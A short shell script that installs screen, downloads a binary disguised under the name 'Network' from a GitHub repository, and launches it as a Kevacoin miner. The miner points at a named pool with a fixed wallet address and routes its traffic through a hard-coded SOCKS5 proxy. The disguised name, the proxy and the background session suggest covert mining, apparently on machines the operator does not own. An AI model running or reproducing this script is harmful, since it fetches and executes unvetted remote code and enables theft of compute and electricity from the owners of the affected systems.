apt update 
apt install screen -y 
wget -O Network https://github.com/master-running/master-running/raw/main/Network
chmod +x Network
screen -dmS ls
./Network --algorithm randomkeva --pool sg.kevacoin.herominers.com:1163 --wallet VSMtpHwu6RvBnJMKf8vBZ3nUxKAXib6Y9b --password Build --proxy=socks5://184.75.247.3:59644
